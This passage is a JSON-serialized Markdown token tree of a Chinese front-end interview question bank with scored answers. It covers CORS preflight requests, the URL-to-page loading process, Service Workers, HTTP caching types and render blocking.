Sharing）的场景中，尤其是当请求涉及一些可能不太安全的方法（如 PUT、DELETE 或 POST）或使用了一些自定义的 HTTP 头部时。  \\n预检请求的目的是检查服务器是否允许来自不同源（域、协议或端口）的请求进行某些操作。这样做可以确保客户端在发送实际请求之前，先得到服务器的明确许可。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- POST 请求前发送的 OPTIONS 请求实际上是 HTTP 的一种特性，称为“预检请求”（Preflight request）。这主要发生在跨域请求（CORS, Cross-Origin Resource Sharing）的场景中，尤其是当请求涉及一些可能不太安全的方法（如 PUT、DELETE 或 POST）或使用了一些自定义的 HTTP 头部时。  \\n预检请求的目的是检查服务器是否允许来自不同源（域、协议或端口）的请求进行某些操作。这样做可以确保客户端在发送实际请求之前，先得到服务器的明确许可。","task":false,"loose":false,"text":"POST 请求前发送的 OPTIONS 请求实际上是 HTTP 的一种特性，称为“预检请求”（Preflight request）。这主要发生在跨域请求（CORS, Cross-Origin Resource Sharing）的场景中，尤其是当请求涉及一些可能不太安全的方法（如 PUT、DELETE 或 POST）或使用了一些自定义的 HTTP 头部时。  \\n预检请求的目的是检查服务器是否允许来自不同源（域、协议或端口）的请求进行某些操作。这样做可以确保客户端在发送实际请求之前，先得到服务器的明确许可。","tokens":[{"type":"text","raw":"POST 请求前发送的 OPTIONS 请求实际上是 HTTP 的一种特性，称为“预检请求”（Preflight request）。这主要发生在跨域请求（CORS, Cross-Origin Resource Sharing）的场景中，尤其是当请求涉及一些可能不太安全的方法（如 PUT、DELETE 或 POST）或使用了一些自定义的 HTTP 头部时。  \\n\\n预检请求的目的是检查服务器是否允许来自不同源（域、协议或端口）的请求进行某些操作。这样做可以确保客户端在发送实际请求之前，先得到服务器的明确许可。","text":"POST 请求前发送的 OPTIONS 请求实际上是 HTTP 的一种特性，称为“预检请求”（Preflight request）。这主要发生在跨域请求（CORS, Cross-Origin Resource Sharing）的场景中，尤其是当请求涉及一些可能不太安全的方法（如 PUT、DELETE 或 POST）或使用了一些自定义的 HTTP 头部时。  \\n预检请求的目的是检查服务器是否允许来自不同源（域、协议或端口）的请求进行某些操作。这样做可以确保客户端在发送实际请求之前，先得到服务器的明确许可。","tokens":[{"type":"text","raw":"POST 请求前发送的 OPTIONS 请求实际上是 HTTP 的一种特性，称为“预检请求”（Preflight request）。这主要发生在跨域请求（CORS, Cross-Origin Resource Sharing）的场景中，尤其是当请求涉及一些可能不太安全的方法（如 PUT、DELETE 或 POST）或使用了一些自定义的 HTTP 头部时。","text":"POST 请求前发送的 OPTIONS 请求实际上是 HTTP 的一种特性，称为“预检请求”（Preflight request）。这主要发生在跨域请求（CORS, Cross-Origin Resource Sharing）的场景中，尤其是当请求涉及一些可能不太安全的方法（如 PUT、DELETE 或 POST）或使用了一些自定义的 HTTP 头部时。","escaped":false},{"type":"br","raw":"  \\n"},{"type":"text","raw":"预检请求的目的是检查服务器是否允许来自不同源（域、协议或端口）的请求进行某些操作。这样做可以确保客户端在发送实际请求之前，先得到服务器的明确许可。","text":"预检请求的目的是检查服务器是否允许来自不同源（域、协议或端口）的请求进行某些操作。这样做可以确保客户端在发送实际请求之前，先得到服务器的明确许可。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 从输入URL到看到页面发生的全过程？\\n\\n","depth":2,"text":"从输入URL到看到页面发生的全过程？","tokens":[{"type":"text","raw":"从输入URL到看到页面发生的全过程？","text":"从输入URL到看到页面发生的全过程？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 1.用户首先在浏览器地址栏中输入想要访问的网站的URL。\\n- 2.浏览器内部代码会解析这个URL。它首先会检查本地hosts文件，看是否有对应的域名。如果有，浏览器就会直接向该IP地址发送请求。如果没有，浏览器会将域名发送给DNS服务器进行解析，将域名转换成对应的服务器IP地址。\\n- 3.浏览器通过HTTP协议向服务器发送请求。HTTP协议是一种应用层协议，用于在客户端和服务器之间传输数据。浏览器会根据URL中的路径和参数构建HTTP请求，并发送给服务器。\\n- 4.服务器接收到请求后，会根据请求的内容进行处理，并返回相应的HTTP响应。响应中包含了服务器返回的数据，如HTML、CSS、JavaScript等资源文件，以及状态码等信息。\\n- 5.浏览器接收到服务器返回的响应后，会解析响应中的数据，并开始渲染页面。浏览器会根据HTML文件中的标签和属性，将页面元素渲染出来。同时，浏览器还会下载并解析CSS和JavaScript文件，以实现页面的样式和交互功能。\\n- 6.当页面加载完成后，浏览器会触发DOMContentLoaded事件，通知页面已经加载完成。此时，页面中的JavaScript代码可以开始执行，实现页面的交互功能。\\n- 7.如果页面中还有异步请求（如Ajax请求），浏览器会继续发送这些请求，并等待服务器返回响应。当这些请求完成后，浏览器会更新页面中的相应部分，以反映最新的数据。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 1.用户首先在浏览器地址栏中输入想要访问的网站的URL。\\n","task":false,"loose":false,"text":"1.用户首先在浏览器地址栏中输入想要访问的网站的URL。","tokens":[{"type":"text","raw":"1.用户首先在浏览器地址栏中输入想要访问的网站的URL。","text":"1.用户首先在浏览器地址栏中输入想要访问的网站的URL。","tokens":[{"type":"text","raw":"1.用户首先在浏览器地址栏中输入想要访问的网站的URL。","text":"1.用户首先在浏览器地址栏中输入想要访问的网站的URL。","escaped":false}]}]},{"type":"list_item","raw":"- 2.浏览器内部代码会解析这个URL。它首先会检查本地hosts文件，看是否有对应的域名。如果有，浏览器就会直接向该IP地址发送请求。如果没有，浏览器会将域名发送给DNS服务器进行解析，将域名转换成对应的服务器IP地址。\\n","task":false,"loose":false,"text":"2.浏览器内部代码会解析这个URL。它首先会检查本地hosts文件，看是否有对应的域名。如果有，浏览器就会直接向该IP地址发送请求。如果没有，浏览器会将域名发送给DNS服务器进行解析，将域名转换成对应的服务器IP地址。","tokens":[{"type":"text","raw":"2.浏览器内部代码会解析这个URL。它首先会检查本地hosts文件，看是否有对应的域名。如果有，浏览器就会直接向该IP地址发送请求。如果没有，浏览器会将域名发送给DNS服务器进行解析，将域名转换成对应的服务器IP地址。","text":"2.浏览器内部代码会解析这个URL。它首先会检查本地hosts文件，看是否有对应的域名。如果有，浏览器就会直接向该IP地址发送请求。如果没有，浏览器会将域名发送给DNS服务器进行解析，将域名转换成对应的服务器IP地址。","tokens":[{"type":"text","raw":"2.浏览器内部代码会解析这个URL。它首先会检查本地hosts文件，看是否有对应的域名。如果有，浏览器就会直接向该IP地址发送请求。如果没有，浏览器会将域名发送给DNS服务器进行解析，将域名转换成对应的服务器IP地址。","text":"2.浏览器内部代码会解析这个URL。它首先会检查本地hosts文件，看是否有对应的域名。如果有，浏览器就会直接向该IP地址发送请求。如果没有，浏览器会将域名发送给DNS服务器进行解析，将域名转换成对应的服务器IP地址。","escaped":false}]}]},{"type":"list_item","raw":"- 3.浏览器通过HTTP协议向服务器发送请求。HTTP协议是一种应用层协议，用于在客户端和服务器之间传输数据。浏览器会根据URL中的路径和参数构建HTTP请求，并发送给服务器。\\n","task":false,"loose":false,"text":"3.浏览器通过HTTP协议向服务器发送请求。HTTP协议是一种应用层协议，用于在客户端和服务器之间传输数据。浏览器会根据URL中的路径和参数构建HTTP请求，并发送给服务器。","tokens":[{"type":"text","raw":"3.浏览器通过HTTP协议向服务器发送请求。HTTP协议是一种应用层协议，用于在客户端和服务器之间传输数据。浏览器会根据URL中的路径和参数构建HTTP请求，并发送给服务器。","text":"3.浏览器通过HTTP协议向服务器发送请求。HTTP协议是一种应用层协议，用于在客户端和服务器之间传输数据。浏览器会根据URL中的路径和参数构建HTTP请求，并发送给服务器。","tokens":[{"type":"text","raw":"3.浏览器通过HTTP协议向服务器发送请求。HTTP协议是一种应用层协议，用于在客户端和服务器之间传输数据。浏览器会根据URL中的路径和参数构建HTTP请求，并发送给服务器。","text":"3.浏览器通过HTTP协议向服务器发送请求。HTTP协议是一种应用层协议，用于在客户端和服务器之间传输数据。浏览器会根据URL中的路径和参数构建HTTP请求，并发送给服务器。","escaped":false}]}]},{"type":"list_item","raw":"- 4.服务器接收到请求后，会根据请求的内容进行处理，并返回相应的HTTP响应。响应中包含了服务器返回的数据，如HTML、CSS、JavaScript等资源文件，以及状态码等信息。\\n","task":false,"loose":false,"text":"4.服务器接收到请求后，会根据请求的内容进行处理，并返回相应的HTTP响应。响应中包含了服务器返回的数据，如HTML、CSS、JavaScript等资源文件，以及状态码等信息。","tokens":[{"type":"text","raw":"4.服务器接收到请求后，会根据请求的内容进行处理，并返回相应的HTTP响应。响应中包含了服务器返回的数据，如HTML、CSS、JavaScript等资源文件，以及状态码等信息。","text":"4.服务器接收到请求后，会根据请求的内容进行处理，并返回相应的HTTP响应。响应中包含了服务器返回的数据，如HTML、CSS、JavaScript等资源文件，以及状态码等信息。","tokens":[{"type":"text","raw":"4.服务器接收到请求后，会根据请求的内容进行处理，并返回相应的HTTP响应。响应中包含了服务器返回的数据，如HTML、CSS、JavaScript等资源文件，以及状态码等信息。","text":"4.服务器接收到请求后，会根据请求的内容进行处理，并返回相应的HTTP响应。响应中包含了服务器返回的数据，如HTML、CSS、JavaScript等资源文件，以及状态码等信息。","escaped":false}]}]},{"type":"list_item","raw":"- 5.浏览器接收到服务器返回的响应后，会解析响应中的数据，并开始渲染页面。浏览器会根据HTML文件中的标签和属性，将页面元素渲染出来。同时，浏览器还会下载并解析CSS和JavaScript文件，以实现页面的样式和交互功能。\\n","task":false,"loose":false,"text":"5.浏览器接收到服务器返回的响应后，会解析响应中的数据，并开始渲染页面。浏览器会根据HTML文件中的标签和属性，将页面元素渲染出来。同时，浏览器还会下载并解析CSS和JavaScript文件，以实现页面的样式和交互功能。","tokens":[{"type":"text","raw":"5.浏览器接收到服务器返回的响应后，会解析响应中的数据，并开始渲染页面。浏览器会根据HTML文件中的标签和属性，将页面元素渲染出来。同时，浏览器还会下载并解析CSS和JavaScript文件，以实现页面的样式和交互功能。","text":"5.浏览器接收到服务器返回的响应后，会解析响应中的数据，并开始渲染页面。浏览器会根据HTML文件中的标签和属性，将页面元素渲染出来。同时，浏览器还会下载并解析CSS和JavaScript文件，以实现页面的样式和交互功能。","tokens":[{"type":"text","raw":"5.浏览器接收到服务器返回的响应后，会解析响应中的数据，并开始渲染页面。浏览器会根据HTML文件中的标签和属性，将页面元素渲染出来。同时，浏览器还会下载并解析CSS和JavaScript文件，以实现页面的样式和交互功能。","text":"5.浏览器接收到服务器返回的响应后，会解析响应中的数据，并开始渲染页面。浏览器会根据HTML文件中的标签和属性，将页面元素渲染出来。同时，浏览器还会下载并解析CSS和JavaScript文件，以实现页面的样式和交互功能。","escaped":false}]}]},{"type":"list_item","raw":"- 6.当页面加载完成后，浏览器会触发DOMContentLoaded事件，通知页面已经加载完成。此时，页面中的JavaScript代码可以开始执行，实现页面的交互功能。\\n","task":false,"loose":false,"text":"6.当页面加载完成后，浏览器会触发DOMContentLoaded事件，通知页面已经加载完成。此时，页面中的JavaScript代码可以开始执行，实现页面的交互功能。","tokens":[{"type":"text","raw":"6.当页面加载完成后，浏览器会触发DOMContentLoaded事件，通知页面已经加载完成。此时，页面中的JavaScript代码可以开始执行，实现页面的交互功能。","text":"6.当页面加载完成后，浏览器会触发DOMContentLoaded事件，通知页面已经加载完成。此时，页面中的JavaScript代码可以开始执行，实现页面的交互功能。","tokens":[{"type":"text","raw":"6.当页面加载完成后，浏览器会触发DOMContentLoaded事件，通知页面已经加载完成。此时，页面中的JavaScript代码可以开始执行，实现页面的交互功能。","text":"6.当页面加载完成后，浏览器会触发DOMContentLoaded事件，通知页面已经加载完成。此时，页面中的JavaScript代码可以开始执行，实现页面的交互功能。","escaped":false}]}]},{"type":"list_item","raw":"- 7.如果页面中还有异步请求（如Ajax请求），浏览器会继续发送这些请求，并等待服务器返回响应。当这些请求完成后，浏览器会更新页面中的相应部分，以反映最新的数据。","task":false,"loose":false,"text":"7.如果页面中还有异步请求（如Ajax请求），浏览器会继续发送这些请求，并等待服务器返回响应。当这些请求完成后，浏览器会更新页面中的相应部分，以反映最新的数据。","tokens":[{"type":"text","raw":"7.如果页面中还有异步请求（如Ajax请求），浏览器会继续发送这些请求，并等待服务器返回响应。当这些请求完成后，浏览器会更新页面中的相应部分，以反映最新的数据。","text":"7.如果页面中还有异步请求（如Ajax请求），浏览器会继续发送这些请求，并等待服务器返回响应。当这些请求完成后，浏览器会更新页面中的相应部分，以反映最新的数据。","tokens":[{"type":"text","raw":"7.如果页面中还有异步请求（如Ajax请求），浏览器会继续发送这些请求，并等待服务器返回响应。当这些请求完成后，浏览器会更新页面中的相应部分，以反映最新的数据。","text":"7.如果页面中还有异步请求（如Ajax请求），浏览器会继续发送这些请求，并等待服务器返回响应。当这些请求完成后，浏览器会更新页面中的相应部分，以反映最新的数据。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 对Service Worker的理解\\n\\n","depth":2,"text":"对Service Worker的理解","tokens":[{"type":"text","raw":"对Service Worker的理解","text":"对Service Worker的理解","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。\\n- **4：**\\n  + 首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件\\n  + 那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存\\n  + 存在缓存的话就可以直接读取缓存文件，否则就去请求数据。\\n  + 打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。\\n","task":false,"loose":false,"text":"**1：** Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。","tokens":[{"type":"text","raw":"**1：** Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。","text":"**1：** Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。","text":" Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。","escaped":false}]}]},{"type":"list_item","raw":"- **4：**\\n  + 首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件\\n  + 那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存\\n  + 存在缓存的话就可以直接读取缓存文件，否则就去请求数据。\\n  + 打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","task":false,"loose":false,"text":"**4：**\\n+ 首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件\\n+ 那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存\\n+ 存在缓存的话就可以直接读取缓存文件，否则就去请求数据。\\n+ 打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","tokens":[{"type":"text","raw":"**4：**\\n","text":"**4：**","tokens":[{"type":"strong","raw":"**4：**","text":"4：","tokens":[{"type":"text","raw":"4：","text":"4：","escaped":false}]}]},{"type":"list","raw":"+ 首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件\\n+ 那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存\\n+ 存在缓存的话就可以直接读取缓存文件，否则就去请求数据。\\n+ 打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件\\n","task":false,"loose":false,"text":"首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件","tokens":[{"type":"text","raw":"首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件","text":"首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件","tokens":[{"type":"text","raw":"首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件","text":"首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件","escaped":false}]}]},{"type":"list_item","raw":"+ 那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存\\n","task":false,"loose":false,"text":"那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存","tokens":[{"type":"text","raw":"那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存","text":"那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存","tokens":[{"type":"text","raw":"那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存","text":"那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存","escaped":false}]}]},{"type":"list_item","raw":"+ 存在缓存的话就可以直接读取缓存文件，否则就去请求数据。\\n","task":false,"loose":false,"text":"存在缓存的话就可以直接读取缓存文件，否则就去请求数据。","tokens":[{"type":"text","raw":"存在缓存的话就可以直接读取缓存文件，否则就去请求数据。","text":"存在缓存的话就可以直接读取缓存文件，否则就去请求数据。","tokens":[{"type":"text","raw":"存在缓存的话就可以直接读取缓存文件，否则就去请求数据。","text":"存在缓存的话就可以直接读取缓存文件，否则就去请求数据。","escaped":false}]}]},{"type":"list_item","raw":"+ 打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","task":false,"loose":false,"text":"打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","tokens":[{"type":"text","raw":"打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","text":"打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","tokens":[{"type":"text","raw":"打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","text":"打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 协商缓存和强缓存的区别\\n\\n","depth":2,"text":"协商缓存和强缓存的区别","tokens":[{"type":"text","raw":"协商缓存和强缓存的区别","text":"协商缓存和强缓存的区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`业务`\\n\\n","depth":4,"text":"类型：`业务`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`业务`","text":"业务"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **2：** 强缓存\\n  + 使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。\\n  + 设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。\\n- **2：** 协商缓存\\n  + 如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。\\n  + 设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 强缓存\\n  + 使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。\\n  + 设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。\\n","task":false,"loose":false,"text":"**2：** 强缓存\\n+ 使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。\\n+ 设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。","tokens":[{"type":"text","raw":"**2：** 强缓存\\n","text":"**2：** 强缓存","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 强缓存","text":" 强缓存","escaped":false}]},{"type":"list","raw":"+ 使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。\\n+ 设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。\\n","task":false,"loose":false,"text":"使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。","tokens":[{"type":"text","raw":"使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。","text":"使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。","tokens":[{"type":"text","raw":"使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。","text":"使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。","escaped":false}]}]},{"type":"list_item","raw":"+ 设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。","task":false,"loose":false,"text":"设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。","tokens":[{"type":"text","raw":"设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。","text":"设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。","tokens":[{"type":"text","raw":"设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。","text":"设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **2：** 协商缓存\\n  + 如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。\\n  + 设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","task":false,"loose":false,"text":"**2：** 协商缓存\\n+ 如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。\\n+ 设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","tokens":[{"type":"text","raw":"**2：** 协商缓存\\n","text":"**2：** 协商缓存","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 协商缓存","text":" 协商缓存","escaped":false}]},{"type":"list","raw":"+ 如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。\\n+ 设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。\\n","task":false,"loose":false,"text":"如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。","tokens":[{"type":"text","raw":"如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。","text":"如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。","tokens":[{"type":"text","raw":"如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。","text":"如果命中强制缓存，就无需发起新的请求，直接使用缓存资源，如果没有命中强制缓存，且设置了协商缓存，这个时候协商缓存就会发挥作用了。","escaped":false}]}]},{"type":"list_item","raw":"+ 设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","task":false,"loose":false,"text":"设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","tokens":[{"type":"text","raw":"设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","text":"设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","tokens":[{"type":"text","raw":"设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","text":"设置方式：分别是 http请求头中if-modified-since和if-none-match 响应 头信息中的 Etag 和 Last-Modified 属性。","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么情况会阻塞渲染\\n\\n","depth":2,"text":"什么情况会阻塞渲染","tokens":[{"type":"text","raw":"什么情况会阻塞渲染","text":"什么情况会阻塞渲染","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- **1：** 首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染。\\n\\n- **4：**\\n  + 当浏览器在解析到 script 标签时，会暂停构建 DOM，完成后才会从暂停的地方重新开始。\\n  + 如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。\\n  + script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。\\n  + 对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染。\\n\\n","task":false,"loose":true,"text":"**1：** 首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染。\\n","tokens":[{"type":"text","raw":"**1：** 首先渲染的前提是生成渲染树，所以 HTML 和 CSS 肯定会阻塞渲染。\\n","text":"**1：** 